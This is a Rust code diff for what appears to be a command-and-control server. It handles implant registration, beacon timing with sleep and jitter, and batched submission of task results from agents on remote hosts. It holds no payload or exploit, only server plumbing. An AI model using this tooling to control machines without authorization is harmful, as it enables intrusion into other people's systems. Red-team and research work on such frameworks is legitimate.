@@ -43,8 +43,8 @@ pub struct Agent
     os:String,
     username:String,
     internal_ip:String,
-    sleep:f32,
-    jitter:f32,
+    sleep:u64,
+    jitter:u64,
     task_queue: Arc<tokio::sync::Mutex<Vec<Task>>>,
     task_results: Arc<tokio::sync::Mutex<Vec<Task>>>
 }
@@ -84,13 +84,9 @@ async fn main() {
     let op_routes=Router::new()
     .route("/ws",any(ws_handler))
     .route("/",get(health_check))
-    // .route("/tasks/{id}",post(op_post_task))
-    // .route("/tasks/{id}",get(op_get_task_result))
-    // .route("/tasks",get(||async{}))
-    // .route("/agents",get(op_get_all_agents))
-    // .route("/agents/{id}",get(||async{}))
     .with_state(shared_state.clone());
     //TODO: Bind to URLs set in .env file
+
     let health_route=Router::new()
     .route("/health", get(health_check));
     let op_app=Router::new()
@@ -100,6 +96,7 @@ async fn main() {
     tokio::spawn(async move{
         axum::serve(op_listener, op_app).await.unwrap();
     });
+    
     //TODO: Bind to URLs set in .env file
     let impl_route=Router::new()
     .route("/beacon",get(implant_beacon))
@@ -137,8 +134,8 @@ async fn implant_register(State(state):State<Arc<AgentState>>,payload:Result<Jso
                                 os:data.os.clone(),
                                 username:data.username.clone(),
                                 internal_ip:data.internal_ip.clone(),
-                                sleep:30.0,
-                                jitter:1.0,
+                                sleep:30000,
+                                jitter:10000,
                                 task_queue:Arc::new(Mutex::new(Vec::new())),
                                 task_results:Arc::new(Mutex::new(Vec::new()))
                             }
@@ -179,43 +176,51 @@ async fn implant_register(State(state):State<Arc<AgentState>>,payload:Result<Jso
 //TODO: Change implant handlers' return type to impl intoresponse
 
 // #[axum::debug_handler]
-async fn implant_result(State(state):State<Arc<AgentState>>,payload:Result<Json<Task>,JsonRejection>)->impl IntoResponse
+async fn implant_result(State(state):State<Arc<AgentState>>,payload:Result<Json<Vec<Task>>,JsonRejection>)->impl IntoResponse
 {
     match payload {
         //TODO: Add code to find and remove corresponding task from the pending queue in state
-        Ok(Json(task)) => {
-            let ref_res_queue: Option<Arc<tokio::sync::Mutex<Vec<Task>>>>={
-                let state_guard=state.agents.read().await;
-                // if (!state_guard.contains_key(&task.agent_id.clone())){
-                //     return StatusCode::INTERNAL_SERVER_ERROR;
-                // }
-                let opt_agent_mutex=state_guard.get(&task.agent_id).cloned();
-                drop(state_guard);
-                if let Some(agent_mutex)=opt_agent_mutex
-                    {
-                        let read_guard=agent_mutex.lock().await;
-                        Some(Arc::clone(&read_guard.task_results))
+        Ok(Json(tasks)) => {
+            let mut success:bool=true;
+            for task in tasks{
+                let ref_res_queue: Option<Arc<tokio::sync::Mutex<Vec<Task>>>>={
+                    let state_guard=state.agents.read().await;
+                    // if (!state_guard.contains_key(&task.agent_id.clone())){
+                    //     return StatusCode::INTERNAL_SERVER_ERROR;
+                    // }
+                    let opt_agent_mutex=state_guard.get(&task.agent_id).cloned();
+                    drop(state_guard);
+                    if let Some(agent_mutex)=opt_agent_mutex
+                        {
+                            let read_guard=agent_mutex.lock().await;
+                            Some(Arc::clone(&read_guard.task_results))
+                        }
+                    else {
+                        None
                     }
-                else {
-                    None
+                };
+                // let mut target_agent=read_guard.get_mut(&task.agent_id);
+                let output_id=task.task_id.clone();
+                if let Some(res_queue)=ref_res_queue{
+                    res_queue.lock().await.push(task.clone());
                 }
-            };
-            // let mut target_agent=read_guard.get_mut(&task.agent_id);
-            let output_id=task.task_id.clone();
-            if let Some(res_queue)=ref_res_queue{
-                res_queue.lock().await.push(task);
+                else
+                {
+                    success=false;
+                }
+                if let Err(_) = state.broadcast_sender.send(Message::Text(format!("Task {} result is available!\n",output_id).into())){
+                    println!("Task update failed to send!");
+                };
             }
-            else
-            {
-                return (StatusCode::IM_A_TEAPOT,"Error adding task").into_response();
+            if success{
+                (StatusCode::OK, "Success").into_response()
             }
-            if let Err(_) = state.broadcast_sender.send(Message::Text(format!("Task {} result is available!\n",output_id).into())){
-                println!("Task update failed to send!");
-            };
-            return (StatusCode::OK, "Success").into_response();
+            else{
+                (StatusCode::IM_A_TEAPOT,"Error adding task results").into_response()
+            }
         }
         Err(_) => {
-            return StatusCode::INTERNAL_SERVER_ERROR.into_response();
+            (StatusCode::INTERNAL_SERVER_ERROR,"Task list not found").into_response()
         }
     }
     // Ok(StatusCode::OK)
